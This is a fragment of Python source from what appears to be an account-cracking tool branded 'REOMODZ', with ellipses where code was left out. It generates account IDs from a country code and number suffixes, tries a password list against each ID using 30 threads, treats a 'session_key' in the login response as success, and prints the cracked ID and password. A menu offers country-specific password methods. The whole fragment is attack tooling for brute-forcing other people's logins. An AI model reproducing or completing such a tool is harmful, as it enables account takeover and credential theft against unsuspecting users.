...
[white][[green]02[white]]. Old india password method   """,
    title=f"{R2}• {K2}• {H2}•{P2} {P2} Select your country password method  {H2}• {K2}• {R2}•",width=80,padding=(0,4),style=f"{color_table}"))              
                ...
                with tred(max_workers=30) as REOMODZ:     
                        clear()
                        id = str(len(user))
                        prints(Panel(f"{P2}TOTAL ACCOUNT : {H2}{id}{P2}{H2}",title=f"{R2}• {K2}• {H2}•{P2} {P2} The process is running in the background {H2}• {K2}• {R2}•",width=80,padding=(0,3),style=f"{color_table}")) 
                        linex()
                        for psx in user:
                                ids = code+psx
                                if pcs in ['1','01']:                                   
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [REOMODZ-OK] '+str(uid)+' | '+pas+'\033[1;97m')
